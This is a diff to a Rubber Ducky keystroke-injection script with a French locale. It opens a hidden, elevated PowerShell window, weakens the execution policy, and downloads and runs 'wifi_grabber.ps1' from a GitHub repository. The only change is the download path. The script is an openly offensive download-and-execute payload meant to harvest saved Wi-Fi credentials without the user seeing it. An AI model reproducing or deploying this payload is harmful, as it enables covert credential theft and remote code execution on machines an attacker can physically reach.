@@ -2,7 +2,7 @@ LOCALE FR
 DELAY 500
 GUI r
 DELAY 200
-STRING powershell Start-Process powershell -Verb runAs -windowstyle hidden {Set-ExecutionPolicy RemoteSigned;wget "https://raw.githubusercontent.com/Allta/Laboratoire/master/wifi_grabber.ps1" -o $env:TEMP\d.ps1;cd $env:TEMP;.\d.ps1}
+STRING powershell Start-Process powershell -Verb runAs -windowstyle hidden {Set-ExecutionPolicy RemoteSigned;wget "https://raw.githubusercontent.com/Allta/Laboratoire/master/DUCKY/Windows 10/Wifi-Grabber/wifi_grabber.ps1" -o $env:TEMP\d.ps1;cd $env:TEMP;.\d.ps1}
 REM Presses Ctrl + Shift + Enter to execute the PowerShell with administrative privileges.
 REM CTRL-SHIFT ENTER
 ENTER
